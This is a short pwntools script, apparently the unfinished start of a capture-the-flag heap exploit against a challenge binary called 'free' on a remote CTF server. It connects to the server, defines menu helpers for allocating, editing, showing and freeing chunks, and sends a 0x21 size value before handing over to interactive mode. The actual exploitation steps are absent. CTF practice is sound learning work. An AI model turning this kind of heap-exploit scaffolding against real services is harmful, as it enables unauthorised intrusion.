#!/usr/bin/env python
from pwn import *

# 

host , port = 'ctf.yuawn.idv.tw' , 10208
y = remote( host , port )


context.arch = 'amd64'

e , l = ELF('./free') , ELF('./libc.so.6')

def add( size , data ):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def sho():
    y.sendafter( 'ice:' , '3' )

def edt( idx , data ):
    y.sendafter( 'ice:' , '2' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( ':' , data )

def dle( idx ):
    y.sendafter( 'ice:' , '4' )
    y.sendafter( ':' , str( idx ) )


# 0x602130

y.sendafter( '?' , 'yuawn' )
y.sendafter( '?' , str( 0x21 ) )


y.interactive()